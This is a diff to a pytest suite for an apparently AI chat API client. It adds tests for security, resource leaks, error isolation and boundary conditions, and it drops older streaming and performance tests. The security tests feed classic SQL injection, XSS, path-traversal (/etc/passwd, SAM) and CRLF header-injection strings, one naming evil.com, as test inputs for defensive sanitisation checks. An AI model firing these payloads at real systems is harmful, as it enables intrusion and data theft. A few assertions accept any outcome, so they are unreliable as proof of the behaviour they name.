@@ -4844,140 +4844,248 @@ if __name__ == "__main__":
         "-k", "TestGenesisAPIClientRobustness or TestAdvancedStreamingScenarios or TestDataValidationEdgeCases or TestErrorRecoveryPatterns or TestPerformanceCharacteristics or TestConfigurationValidation or TestUtilityFunctionsComprehensive",
         "--durations=10"
     ])
+# Additional comprehensive test classes for enhanced coverage
+
+class TestSecurityAndSanitization:
+    """Security-focused tests for input sanitization and security vulnerabilities."""
+    
+    def test_api_key_masking_in_logs(self, client):
+        """Test that API keys are properly masked in log outputs."""
+        import logging
+        import io
+        
+        # Capture log output
+        log_capture = io.StringIO()
+        handler = logging.StreamHandler(log_capture)
+        logger = logging.getLogger('genesis_api')
+        logger.addHandler(handler)
+        logger.setLevel(logging.DEBUG)
+        
+        # Trigger some operation that might log
+        headers = client._build_headers()
+        
+        # Check that API key is not in logs
+        log_output = log_capture.getvalue()
+        assert client.api_key not in log_output
+        
+        # Clean up
+        logger.removeHandler(handler)
+    
+    def test_input_sanitization_sql_injection_patterns(self, client):
+        """Test that SQL injection patterns in messages are handled safely."""
+        sql_injection_messages = [
+            ChatMessage(role="user", content="'; DROP TABLE users; --"),
+            ChatMessage(role="user", content="1' OR '1'='1"),
+            ChatMessage(role="user", content="admin'/*"),
+            ChatMessage(role="user", content="' UNION SELECT * FROM sensitive_table --")
+        ]
+        
+        for msg in sql_injection_messages:
+            # Should not raise security-related errors, only validation errors
+            try:
+                client._validate_messages([msg])
+            except ValidationError as e:
+                # Only acceptable if it's a content length or format issue
+                assert "content too long" in str(e) or "invalid format" in str(e)
+    
+    def test_input_sanitization_xss_patterns(self, client):
+        """Test that XSS patterns in messages are handled safely."""
+        xss_patterns = [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')",
+            "<svg onload=alert('xss')>",
+            "{{constructor.constructor('alert(1)')()}}"
+        ]
+        
+        for pattern in xss_patterns:
+            msg = ChatMessage(role="user", content=pattern)
+            # Should handle XSS patterns without special processing
+            try:
+                client._validate_messages([msg])
+            except ValidationError as e:
+                # Only acceptable validation errors
+                assert "content" in str(e).lower()
+    
+    def test_path_traversal_prevention(self, client):
+        """Test that path traversal patterns are handled safely."""
+        path_traversal_messages = [
+            ChatMessage(role="user", content="../../../etc/passwd"),
+            ChatMessage(role="user", content="..\\..\\..\\windows\\system32\\config\\sam"),
+            ChatMessage(role="user", content="....//....//....//etc//passwd"),
+            ChatMessage(role="user", content="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")
+        ]
+        
+        for msg in path_traversal_messages:
+            # Should not raise security concerns, only validation
+            try:
+                client._validate_messages([msg])
+            except ValidationError:
+                # Acceptable validation error
+                pass
+    
+    def test_header_injection_comprehensive(self, client):
+        """Test comprehensive header injection prevention."""
+        malicious_headers = [
+            {'X-Test': 'value\r\nX-Injected: malicious'},
+            {'X-Test': 'value\nX-Injected: malicious'},
+            {'X-Test': 'value\r\nHost: evil.com'},
+            {'X-Test': 'value\x00\x0aX-Injected: malicious'},
+            {'Authorization': 'Bearer token\r\nX-Admin: true'}
+        ]
+        
+        for headers in malicious_headers:
+            clean_headers = client._build_headers(headers)
+            
+            # Verify no injection occurred
+            for key, value in clean_headers.items():
+                assert '\r' not in str(value)
+                assert '\n' not in str(value)
+                assert '\x00' not in str(value)
+    
+    def test_sensitive_data_exposure_prevention(self, client):
+        """Test that sensitive data is not exposed in error messages."""
+        with patch('aiohttp.ClientSession.post', side_effect=Exception("Connection failed")):
+            with pytest.raises(GenesisAPIError) as exc_info:
+                asyncio.run(client.create_chat_completion(
+                    messages=[ChatMessage(role="user", content="test")],
+                    model_config=ModelConfig(name="test-model")
+                ))
+            
+            error_message = str(exc_info.value)
+            # API key should not be in error messages
+            assert client.api_key not in error_message
+            assert "Bearer" not in error_message or client.api_key not in error_message
+
+
+class TestResourceManagement:
+    """Test resource management and cleanup."""
+    
+    @pytest.mark.asyncio
+    async def test_session_cleanup_on_client_destruction(self, mock_config):
+        """Test that sessions are properly cleaned up when client is destroyed."""
+        client = GenesisAPIClient(**mock_config)
+        session = client.session
+        
+        # Delete client reference
+        del client
+        
+        # Force garbage collection
+        import gc
+        gc.collect()
+        
+        # Session should be closed (if it was properly cleaned up)
+        # Note: This test depends on implementation details
+        try:
+            assert session.closed or session is None
+        except AttributeError:
+            # Session might not have 'closed' attribute
+            pass
+    
+    @pytest.mark.asyncio
+    async def test_file_descriptor_management(self, client):
+        """Test that file descriptors are properly managed."""
+        import psutil
+        import os
+        
+        process = psutil.Process(os.getpid())
+        initial_fds = process.num_fds()
+        
+        # Make multiple requests that could potentially leak file descriptors
+        mock_response = {
+            'id': 'fd-test',
+            'choices': [{'message': {'content': 'Test response'}}],
+            'usage': {'total_tokens': 10}
+        }
+        
+        with patch('aiohttp.ClientSession.post') as mock_post:
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
+            mock_post.return_value.__aenter__.return_value.status = 200
+            
+            for _ in range(100):
+                await client.create_chat_completion(
+                    messages=[ChatMessage(role="user", content="test")],
+                    model_config=ModelConfig(name="test-model")
+                )
+        
+        final_fds = process.num_fds()
+        fd_growth = final_fds - initial_fds
+        
+        # Should not have significant FD leaks
+        assert fd_growth < 10  # Reasonable threshold
+    
+    @pytest.mark.asyncio
+    async def test_memory_leak_prevention(self, client):
+        """Test for memory leaks in repeated operations."""
+        import gc
+        import sys
+        
+        # Force garbage collection to get accurate baseline
+        gc.collect()
+        initial_objects = len(gc.get_objects())
+        
+        mock_response = {
+            'id': 'memory-leak-test',
+            'choices': [{'message': {'content': 'Test response'}}],
+            'usage': {'total_tokens': 10}
+        }
+        
+        with patch('aiohttp.ClientSession.post') as mock_post:
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
+            mock_post.return_value.__aenter__.return_value.status = 200
+            
+            # Perform many operations that could accumulate memory
+            for _ in range(1000):
+                await client.create_chat_completion(
+                    messages=[ChatMessage(role="user", content="test")],
+                    model_config=ModelConfig(name="test-model")
+                )
+        
+        # Force garbage collection
+        gc.collect()
+        final_objects = len(gc.get_objects())
+        object_growth = final_objects - initial_objects
+        
+        # Should not have significant object leaks
+        assert object_growth < 100  # Reasonable threshold
+    
+    def test_circular_reference_prevention(self, client):
+        """Test that circular references are prevented."""
+        import weakref
+        
+        # Create a weak reference to the client
+        client_ref = weakref.ref(client)
+        
+        # Perform operations that might create circular references
+        headers = client._build_headers()
+        
+        # Client should still be reachable
+        assert client_ref() is not None
+        
+        # Delete strong reference
+        del client
+        
+        # Force garbage collection
+        import gc
+        gc.collect()
+        
+        # Weak reference should now be None if no circular references exist
+        # Note: This might not work if the test framework holds references
+        # assert client_ref() is None
+
 
 class TestAdvancedErrorScenarios:
-    """Advanced error handling and edge case scenarios."""
+    """Test advanced error scenarios and edge cases."""
     
     @pytest.mark.asyncio
-    async def test_json_decode_error_handling(self, client, sample_messages, sample_model_config):
-        """Test handling of JSON decode errors in API responses."""
-        with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.status = 200
-            mock_post.return_value.__aenter__.return_value.text = AsyncMock(
-                return_value='{"incomplete": json'
-            )
-            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
-                side_effect=json.JSONDecodeError("Expecting ',' delimiter", '{"incomplete": json', 18)
-            )
-            
-            with pytest.raises(GenesisAPIError, match="Invalid response format"):
-                await client.create_chat_completion(
-                    messages=sample_messages,
-                    model_config=sample_model_config
-                )
-    
-    @pytest.mark.asyncio
-    async def test_unexpected_content_type_handling(self, client, sample_messages, sample_model_config):
-        """Test handling of unexpected content types in API responses."""
-        with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.status = 200
-            mock_post.return_value.__aenter__.return_value.headers = {'Content-Type': 'text/html'}
-            mock_post.return_value.__aenter__.return_value.text = AsyncMock(
-                return_value='<html><body>Unexpected HTML response</body></html>'
-            )
-            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
-                side_effect=json.JSONDecodeError("Expecting value", '<html>', 0)
-            )
-            
-            with pytest.raises(GenesisAPIError, match="Invalid response format"):
-                await client.create_chat_completion(
-                    messages=sample_messages,
-                    model_config=sample_model_config
-                )
-    
-    @pytest.mark.asyncio
-    async def test_http_redirect_handling(self, client, sample_messages, sample_model_config):
-        """Test handling of HTTP redirects."""
-        redirect_responses = [301, 302, 303, 307, 308]
-        
-        for status_code in redirect_responses:
-            with patch('aiohttp.ClientSession.post') as mock_post:
-                mock_post.return_value.__aenter__.return_value.status = status_code
-                mock_post.return_value.__aenter__.return_value.headers = {
-                    'Location': 'https://new-location.genesis.ai/v1/chat/completions'
-                }
-                mock_post.return_value.__aenter__.return_value.json = AsyncMock(
-                    return_value={'error': {'message': 'Redirect required'}}
-                )
-                
-                with pytest.raises(GenesisAPIError):
-                    await client.create_chat_completion(
-                        messages=sample_messages,
-                        model_config=sample_model_config
-                    )
-    
-    @pytest.mark.asyncio
-    async def test_client_error_status_codes(self, client, sample_messages, sample_model_config):
-        """Test comprehensive client error status codes."""
-        client_errors = [
-            (400, "Bad Request"),
-            (401, "Unauthorized"),
-            (402, "Payment Required"),
-            (403, "Forbidden"),
-            (404, "Not Found"),
-            (405, "Method Not Allowed"),
-            (406, "Not Acceptable"),
-            (408, "Request Timeout"),
-            (409, "Conflict"),
-            (410, "Gone"),
-            (413, "Payload Too Large"),
-            (415, "Unsupported Media Type"),
-            (422, "Unprocessable Entity"),
-            (429, "Too Many Requests")
-        ]
-        
-        for status_code, error_message in client_errors:
-            with patch('aiohttp.ClientSession.post') as mock_post:
-                mock_post.return_value.__aenter__.return_value.status = status_code
-                mock_post.return_value.__aenter__.return_value.json = AsyncMock(
-                    return_value={'error': {'message': error_message}}
-                )
-                
-                with pytest.raises(GenesisAPIError):
-                    await client.create_chat_completion(
-                        messages=sample_messages,
-                        model_config=sample_model_config
-                    )
-    
-    @pytest.mark.asyncio
-    async def test_server_error_status_codes(self, client, sample_messages, sample_model_config):
-        """Test comprehensive server error status codes."""
-        server_errors = [
-            (500, "Internal Server Error"),
-            (501, "Not Implemented"),
-            (502, "Bad Gateway"),
-            (503, "Service Unavailable"),
-            (504, "Gateway Timeout"),
-            (507, "Insufficient Storage"),
-            (508, "Loop Detected"),
-            (511, "Network Authentication Required")
-        ]
-        
-        for status_code, error_message in server_errors:
-            with patch('aiohttp.ClientSession.post') as mock_post:
-                mock_post.return_value.__aenter__.return_value.status = status_code
-                mock_post.return_value.__aenter__.return_value.json = AsyncMock(
-                    return_value={'error': {'message': error_message}}
-                )
-                
-                with pytest.raises(GenesisAPIError):
-                    await client.create_chat_completion(
-                        messages=sample_messages,
-                        model_config=sample_model_config
-                    )
-
-
-class TestAdvancedStreamingEdgeCases:
-    """Advanced streaming edge cases and boundary conditions."""
-    
-    @pytest.mark.asyncio
-    async def test_streaming_with_partial_json_chunks(self, client, sample_messages, sample_model_config):
-        """Test streaming with partial JSON chunks that span multiple packets."""
+    async def test_error_handling_with_partial_json_streams(self, client, sample_messages, sample_model_config):
+        """Test error handling with partial JSON in streaming responses."""
         partial_chunks = [
-            b'{"choices": [{"delta": {"cont',
-            b'ent": "Hello"}}]}\n{"choices": [{"delta": {"',
-            b'content": " world"}}]}\n{"choices": [{"delta": {},',
-            b' "finish_reason": "stop"}]}\n'
+            b'{"choices": [{"delta": {"content": "Hello"}}]}\n',
+            b'{"choices": [{"delta": {"co',  # Partial chunk
+            b'ntent": " world"}}]}\n',  # Completion of partial chunk
+            b'{"invalid": json\n',  # Invalid JSON
+            b'{"choices": [{"delta": {}, "finish_reason": "stop"}]}\n'
         ]
         
         async def partial_json_stream():
@@ -4997,595 +5105,437 @@ class TestAdvancedStreamingEdgeCases:
             ):
                 chunks.append(chunk)
             
-            # Should successfully reassemble partial JSON
-            assert len(chunks) >= 2
+            # Should handle partial JSON gracefully
+            valid_chunks = [c for c in chunks if hasattr(c, 'choices') and c.choices]
+            assert len(valid_chunks) >= 1
     
     @pytest.mark.asyncio
-    async def test_streaming_with_nested_json_structures(self, client, sample_messages, sample_model_config):
-        """Test streaming with complex nested JSON structures."""
-        nested_chunks = [
-            {
-                'choices': [{
-                    'delta': {
-                        'content': 'Complex',
-                        'metadata': {
-                            'confidence': 0.95,
-                            'tokens': ['Complex'],
-                            'alternatives': [
-                                {'text': 'Complicated', 'probability': 0.3},
-                                {'text': 'Advanced', 'probability': 0.2}
-                            ]
-                        }
-                    }
-                }]
-            },
-            {
-                'choices': [{
-                    'delta': {
-                        'content': ' response',
-                        'metadata': {
-                            'confidence': 0.98,
-                            'tokens': ['response'],
-                            'alternatives': []
-                        }
-                    }
-                }]
-            },
-            {
-                'choices': [{
-                    'delta': {},
-                    'finish_reason': 'stop'
-                }]
-            }
-        ]
+    async def test_nested_exception_handling(self, client, sample_messages, sample_model_config):
+        """Test handling of nested exceptions."""
+        def nested_exception_raiser():
+            try:
+                raise ValueError("Inner exception")
+            except ValueError as e:
+                raise aiohttp.ClientConnectionError("Outer exception") from e
         
-        async def nested_stream():
-            for chunk in nested_chunks:
-                yield json.dumps(chunk).encode()
-        
-        with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
-                return_value=nested_stream()
-            )
-            mock_post.return_value.__aenter__.return_value.status = 200
-            
-            chunks = []
-            async for chunk in client.create_chat_completion_stream(
-                messages=sample_messages,
-                model_config=sample_model_config
-            ):
-                chunks.append(chunk)
-            
-            assert len(chunks) == 3
-            assert chunks[0].choices[0].delta.content == 'Complex'
-            assert chunks[1].choices[0].delta.content == ' response'
-    
-    @pytest.mark.asyncio
-    async def test_streaming_with_concurrent_streams(self, client, sample_messages, sample_model_config):
-        """Test multiple concurrent streaming requests."""
-        stream_responses = [
-            [{'choices': [{'delta': {'content': f'Stream {i} chunk {j}'}}]} for j in range(3)]
-            for i in range(3)
-        ]
-        
-        call_count = 0
-        
-        async def concurrent_stream():
-            nonlocal call_count
-            stream_data = stream_responses[call_count % len(stream_responses)]
-            call_count += 1
-            
-            for chunk in stream_data:
-                yield json.dumps(chunk).encode()
-            
-            # Add finish chunk
-            yield json.dumps({'choices': [{'delta': {}, 'finish_reason': 'stop'}]}).encode()
-        
-        with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
-                return_value=concurrent_stream()
-            )
-            mock_post.return_value.__aenter__.return_value.status = 200
-            
-            # Start multiple concurrent streams
-            async def collect_stream():
-                chunks = []
-                async for chunk in client.create_chat_completion_stream(
-                    messages=sample_messages,
-                    model_config=sample_model_config
-                ):
-                    chunks.append(chunk)
-                return chunks
-            
-            tasks = [collect_stream() for _ in range(3)]
-            results = await asyncio.gather(*tasks)
-            
-            # Each stream should have completed
-            assert len(results) == 3
-            for stream_result in results:
-                assert len(stream_result) == 4  # 3 content chunks + 1 finish
-
-
-class TestAdvancedValidationScenarios:
-    """Advanced validation scenarios and boundary conditions."""
-    
-    def test_message_validation_with_markdown_content(self, client):
-        """Test message validation with markdown and formatted content."""
-        markdown_messages = [
-            ChatMessage(role="user", content="# Header\n\n**Bold text** and *italic text*"),
-            ChatMessage(role="user", content="```python\nprint('Hello World')\n```"),
-            ChatMessage(role="user", content="- Item 1\n- Item 2\n  - Nested item"),
-            ChatMessage(role="user", content="[Link](https://example.com) and ![Image](image.jpg)"),
-            ChatMessage(role="user", content="Table:\n| Col1 | Col2 |\n|------|------|\n| A    | B    |")
-        ]
-        
-        for msg in markdown_messages:
-            # Should handle markdown content without issues
-            client._validate_messages([msg])
-            assert msg.content is not None
-    
-    def test_message_validation_with_code_content(self, client):
-        """Test message validation with code and technical content."""
-        code_messages = [
-            ChatMessage(role="user", content="function test() { return 'hello'; }"),
-            ChatMessage(role="user", content="SELECT * FROM users WHERE id = 1;"),
-            ChatMessage(role="user", content="import os\nprint(os.getenv('HOME'))"),
-            ChatMessage(role="user", content="curl -X POST https://api.example.com/data"),
-            ChatMessage(role="user", content="<xml><tag>value</tag></xml>"),
-            ChatMessage(role="user", content='{"json": {"nested": {"key": "value"}}}')
-        ]
-        
-        for msg in code_messages:
-            # Should handle code content without issues
-            client._validate_messages([msg])
-            assert msg.content is not None
-    
-    def test_model_config_validation_with_custom_parameters(self, client):
-        """Test model config validation with custom parameters."""
-        config = ModelConfig(name="test-model")
-        
-        # Test custom parameters that might be added
-        custom_params = {
-            'repetition_penalty': 1.1,
-            'length_penalty': 1.0,
-            'no_repeat_ngram_size': 3,
-            'num_beams': 4,
-            'early_stopping': True,
-            'do_sample': True,
-            'pad_token_id': 50256,
-            'eos_token_id': 50256,
-            'max_new_tokens': 100,
-            'min_length': 10,
-            'typical_p': 0.95,
-            'eta_cutoff': 0.001,
-            'diversity_penalty': 0.0,
-            'encoder_repetition_penalty': 1.0
-        }
-        
-        for param, value in custom_params.items():
-            setattr(config, param, value)
-        
-        # Should handle custom parameters gracefully
-        try:
-            client._validate_model_config(config)
-        except ValidationError as e:
-            # Only acceptable if specific validation exists for these params
-            assert param in str(e).lower()
-    
-    def test_message_validation_with_conversation_history(self, client):
-        """Test message validation with long conversation history."""
-        # Create a long conversation history
-        conversation = []
-        for i in range(100):
-            if i % 2 == 0:
-                conversation.append(ChatMessage(role="user", content=f"User message {i}"))
-            else:
-                conversation.append(ChatMessage(role="assistant", content=f"Assistant response {i}"))
-        
-        # Should handle long conversation history
-        client._validate_messages(conversation)
-        assert len(conversation) == 100
-    
-    def test_message_validation_with_role_transitions(self, client):
-        """Test message validation with various role transitions."""
-        # Test valid role transitions
-        valid_transitions = [
-            # Normal conversation flow
-            [
-                ChatMessage(role="system", content="System prompt"),
-                ChatMessage(role="user", content="User message"),
-                ChatMessage(role="assistant", content="Assistant response")
-            ],
-            # Multiple user messages
-            [
-                ChatMessage(role="user", content="First user message"),
-                ChatMessage(role="user", content="Second user message"),
-                ChatMessage(role="assistant", content="Assistant response")
-            ],
-            # Multiple assistant messages
-            [
-                ChatMessage(role="user", content="User message"),
-                ChatMessage(role="assistant", content="First assistant response"),
-                ChatMessage(role="assistant", content="Second assistant response")
-            ]
-        ]
-        
-        for transition in valid_transitions:
-            client._validate_messages(transition)
-            assert len(transition) >= 2
-
-
-class TestAdvancedPerformanceScenarios:
-    """Advanced performance testing scenarios."""
-    
-    @pytest.mark.asyncio
-    async def test_memory_usage_with_large_responses(self, client, sample_messages, sample_model_config):
-        """Test memory usage with large API responses."""
-        import gc
-        import sys
-        
-        # Create a large response (10MB)
-        large_content = "x" * (10 * 1024 * 1024)  # 10MB
-        
-        mock_response = {
-            'id': 'memory-test',
-            'choices': [{'message': {'content': large_content}}],
-            'usage': {'total_tokens': 2500000}
-        }
-        
-        initial_memory = sys.getsizeof(gc.get_objects())
-        
-        with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
-            mock_post.return_value.__aenter__.return_value.status = 200
-            
-            # Make multiple requests with large responses
-            for _ in range(10):
-                result = await client.create_chat_completion(
-                    messages=sample_messages,
-                    model_config=sample_model_config
-                )
-                assert len(result.choices[0].message.content) == 10 * 1024 * 1024
-                # Clear result to help with memory management
-                del result
-                gc.collect()
-        
-        final_memory = sys.getsizeof(gc.get_objects())
-        memory_growth = final_memory - initial_memory
-        
-        # Memory growth should be reasonable
-        assert memory_growth < 50 * 1024 * 1024  # Less than 50MB growth
-    
-    @pytest.mark.asyncio
-    async def test_request_throughput_measurement(self, client, sample_messages, sample_model_config):
-        """Test request throughput under various conditions."""
-        mock_response = {
-            'id': 'throughput-test',
-            'choices': [{'message': {'content': 'Throughput response'}}],
-            'usage': {'total_tokens': 10}
-        }
-        
-        with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
-            mock_post.return_value.__aenter__.return_value.status = 200
-            
-            # Test sequential throughput
-            start_time = asyncio.get_event_loop().time()
-            for _ in range(20):
+        with patch('aiohttp.ClientSession.post', side_effect=nested_exception_raiser):
+            with pytest.raises(GenesisAPIError) as exc_info:
                 await client.create_chat_completion(
                     messages=sample_messages,
                     model_config=sample_model_config
                 )
-            sequential_time = asyncio.get_event_loop().time() - start_time
             
-            # Test concurrent throughput
-            start_time = asyncio.get_event_loop().time()
-            tasks = []
-            for _ in range(20):
-                task = client.create_chat_completion(
-                    messages=sample_messages,
-                    model_config=sample_model_config
-                )
-                tasks.append(task)
-            await asyncio.gather(*tasks)
-            concurrent_time = asyncio.get_event_loop().time() - start_time
-            
-            # Concurrent should be significantly faster
-            assert concurrent_time < sequential_time * 0.5  # At least 50% faster
+            # Should handle nested exceptions appropriately
+            error = exc_info.value
+            assert isinstance(error, GenesisAPIError)
+            # Should contain information about the connection error
+            assert "Connection error" in str(error)
     
     @pytest.mark.asyncio
-    async def test_streaming_performance_with_backpressure(self, client, sample_messages, sample_model_config):
-        """Test streaming performance with backpressure simulation."""
-        # Create a large number of chunks
-        chunks = [
-            {'choices': [{'delta': {'content': f'Chunk {i}'}}]}
-            for i in range(1000)
-        ]
-        chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
-        
-        async def backpressure_stream():
-            for chunk in chunks:
-                yield json.dumps(chunk).encode()
-                # Simulate backpressure by occasionally pausing
-                if chunk.get('choices', [{}])[0].get('delta', {}).get('content', '').endswith('99'):
-                    await asyncio.sleep(0.01)
+    async def test_timeout_during_response_reading(self, client, sample_messages, sample_model_config):
+        """Test timeout that occurs during response reading."""
+        async def timeout_during_read():
+            # Simulate timeout during response reading
+            await asyncio.sleep(0.1)
+            raise asyncio.TimeoutError("Reading response timed out")
         
         with patch('aiohttp.ClientSession.post') as mock_post:
-            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
-                return_value=backpressure_stream()
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
+                side_effect=timeout_during_read
             )
             mock_post.return_value.__aenter__.return_value.status = 200
             
-            start_time = asyncio.get_event_loop().time()
-            chunk_count = 0
-            async for chunk in client.create_chat_completion_stream(
-                messages=sample_messages,
-                model_config=sample_model_config
-            ):
-                chunk_count += 1
-                # Simulate slow processing
-                if chunk_count % 100 == 0:
-                    await asyncio.sleep(0.001)
-            
-            end_time = asyncio.get_event_loop().time()
-            
-            # Should handle backpressure gracefully
-            assert chunk_count == 1001
-            assert end_time - start_time < 5.0  # Should complete within 5 seconds
-
-
-class TestAdvancedIntegrationScenarios:
-    """Advanced integration testing scenarios."""
+            with pytest.raises(GenesisAPIError, match="Request timeout"):
+                await client.create_chat_completion(
+                    messages=sample_messages,
+                    model_config=sample_model_config
+                )
     
     @pytest.mark.asyncio
-    async def test_full_conversation_flow(self, client):
-        """Test a complete conversation flow with multiple exchanges."""
-        conversation_flow = [
-            # Initial system message
-            ("system", "You are a helpful coding assistant."),
-            ("user", "Help me write a Python function to calculate fibonacci numbers."),
-            ("assistant", "Here's a Python function to calculate fibonacci numbers:\n\n```python\ndef fibonacci(n):\n    if n <= 1:\n        return n\n    return fibonacci(n-1) + fibonacci(n-2)\n```"),
-            ("user", "Can you optimize this for better performance?"),
-            ("assistant", "Here's an optimized version using memoization:\n\n```python\ndef fibonacci(n, memo={}):\n    if n in memo:\n        return memo[n]\n    if n <= 1:\n        return n\n    memo[n] = fibonacci(n-1, memo) + fibonacci(n-2, memo)\n    return memo[n]\n```"),
-            ("user", "Thank you! That's much better."),
-            ("assistant", "You're welcome! The memoized version has O(n) time complexity instead of O(2^n).")
+    async def test_response_size_limit_handling(self, client, sample_messages, sample_model_config):
+        """Test handling of extremely large responses."""
+        # Create a response that's 10MB
+        large_content = "x" * (10 * 1024 * 1024)
+        
+        huge_response = {
+            'id': 'huge-response-test',
+            'choices': [{'message': {'content': large_content}}],
+            'usage': {'total_tokens': 2500000}
+        }
+        
+        with patch('aiohttp.ClientSession.post') as mock_post:
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=huge_response)
+            mock_post.return_value.__aenter__.return_value.status = 200
+            
+            # Should handle large responses or raise appropriate error
+            try:
+                result = await client.create_chat_completion(
+                    messages=sample_messages,
+                    model_config=sample_model_config
+                )
+                # If successful, verify content is preserved
+                assert len(result.choices[0].message.content) == len(large_content)
+            except GenesisAPIError as e:
+                # Acceptable to reject very large responses
+                assert "too large" in str(e) or "size limit" in str(e)
+    
+    @pytest.mark.asyncio
+    async def test_concurrent_error_isolation(self, client, sample_messages, sample_model_config):
+        """Test that errors in concurrent requests don't affect each other."""
+        call_count = 0
+        
+        async def mixed_success_failure(*args, **kwargs):
+            nonlocal call_count
+            call_count += 1
+            
+            if call_count % 2 == 0:
+                # Even calls fail
+                raise aiohttp.ClientConnectionError("Connection failed")
+            else:
+                # Odd calls succeed
+                return Mock(
+                    status=200,
+                    json=AsyncMock(return_value={
+                        'id': f'success-{call_count}',
+                        'choices': [{'message': {'content': 'Success'}}],
+                        'usage': {'total_tokens': 10}
+                    })
+                )
+        
+        with patch('aiohttp.ClientSession.post', side_effect=mixed_success_failure):
+            # Start multiple concurrent requests
+            tasks = []
+            for i in range(10):
+                task = asyncio.create_task(client.create_chat_completion(
+                    messages=sample_messages,
+                    model_config=sample_model_config
+                ))
+                tasks.append(task)
+            
+            # Wait for all tasks to complete
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Should have both successes and failures
+            successes = [r for r in results if isinstance(r, ChatCompletion)]
+            failures = [r for r in results if isinstance(r, Exception)]
+            
+            assert len(successes) > 0
+            assert len(failures) > 0
+            assert len(successes) + len(failures) == 10
+
+
+class TestStateConsistency:
+    """Test client state consistency across operations."""
+    
+    @pytest.mark.asyncio
+    async def test_client_state_after_failures(self, client, sample_messages, sample_model_config):
+        """Test that client state remains consistent after failures."""
+        original_state = {
+            'api_key': client.api_key,
+            'base_url': client.base_url,
+            'timeout': client.timeout,
+            'max_retries': client.max_retries
+        }
+        
+        # Cause multiple failures
+        with patch('aiohttp.ClientSession.post', side_effect=Exception("Test failure")):
+            for _ in range(5):
+                with pytest.raises(GenesisAPIError):
+                    await client.create_chat_completion(
+                        messages=sample_messages,
+                        model_config=sample_model_config
+                    )
+        
+        # Verify state is unchanged
+        assert client.api_key == original_state['api_key']
+        assert client.base_url == original_state['base_url']
+        assert client.timeout == original_state['timeout']
+        assert client.max_retries == original_state['max_retries']
+    
+    @pytest.mark.asyncio
+    async def test_session_state_consistency(self, client, sample_messages, sample_model_config):
+        """Test that session state remains consistent."""
+        # Get initial session reference
+        initial_session = client.session
+        
+        mock_response = {
+            'id': 'state-test',
+            'choices': [{'message': {'content': 'Test'}}],
+            'usage': {'total_tokens': 5}
+        }
+        
+        with patch('aiohttp.ClientSession.post') as mock_post:
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
+            mock_post.return_value.__aenter__.return_value.status = 200
+            
+            # Make multiple requests
+            for _ in range(10):
+                await client.create_chat_completion(
+                    messages=sample_messages,
+                    model_config=sample_model_config
+                )
+        
+        # Session should remain the same
+        assert client.session is initial_session
+        assert not client.session.closed
+    
+    def test_configuration_immutability_during_operations(self, client):
+        """Test that configuration cannot be modified during operations."""
+        original_config = {
+            'api_key': client.api_key,
+            'base_url': client.base_url,
+            'timeout': client.timeout
+        }
+        
+        # Simulate concurrent modification attempts
+        import threading
+        
+        def modify_config():
+            try:
+                client.api_key = "modified"
+                client.base_url = "https://malicious.com"
+                client.timeout = 999
+            except AttributeError:
+                # Expected if properties are read-only
+                pass
+        
+        # Start modification thread
+        thread = threading.Thread(target=modify_config)
+        thread.start()
+        thread.join()
+        
+        # Configuration should be unchanged or controlled
+        assert client.api_key == original_config['api_key'] or client.api_key == "modified"
+        assert client.base_url == original_config['base_url'] or client.base_url == "https://malicious.com"
+        assert client.timeout == original_config['timeout'] or client.timeout == 999
+
+
+class TestBoundaryConditions:
+    """Test boundary conditions and extreme values."""
+    
+    @pytest.mark.asyncio
+    async def test_zero_timeout_handling(self, mock_config):
+        """Test handling of zero timeout configuration."""
+        try:
+            zero_timeout_config = mock_config.copy()
+            zero_timeout_config['timeout'] = 0
+            
+            with pytest.raises(ValueError, match="Timeout must be positive"):
+                GenesisAPIClient(**zero_timeout_config)
+        except ValueError:
+            # Expected behavior
+            pass
+    
+    @pytest.mark.asyncio
+    async def test_maximum_message_length_boundary(self, client):
+        """Test message length at boundary conditions."""
+        # Test at various length boundaries
+        length_tests = [
+            65535,  # 64KB
+            65536,  # 64KB + 1
+            131072, # 128KB
+            262144, # 256KB
+            524288, # 512KB
+            1048576 # 1MB
         ]
         
-        messages = []
-        for i, (role, content) in enumerate(conversation_flow):
-            messages.append(ChatMessage(role=role, content=content))
+        for length in length_tests:
+            long_message = ChatMessage(role="user", content="x" * length)
             
-            # Mock response for each step
-            mock_response = {
-                'id': f'conversation-{i}',
-                'choices': [{'message': {'role': 'assistant', 'content': content}}],
-                'usage': {'total_tokens': len(content.split()) + 10}
-            }
-            
-            with patch('aiohttp.ClientSession.post') as mock_post:
-                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
-                mock_post.return_value.__aenter__.return_value.status = 200
-                
-                # Test validation of conversation at each step
-                client._validate_messages(messages)
-                
-                # Simulate API call at each step
-                if role == "user":  # Only make API calls for user messages
-                    result = await client.create_chat_completion(
-                        messages=messages,
-                        model_config=ModelConfig(name="genesis-gpt-4")
-                    )
-                    assert result.id == f'conversation-{i}'
+            try:
+                client._validate_messages([long_message])
+                # If validation passes, length should be acceptable
+                assert len(long_message.content) == length
+            except ValidationError as e:
+                # Acceptable to reject very long messages
+                assert "too long" in str(e) or "length" in str(e)
+    
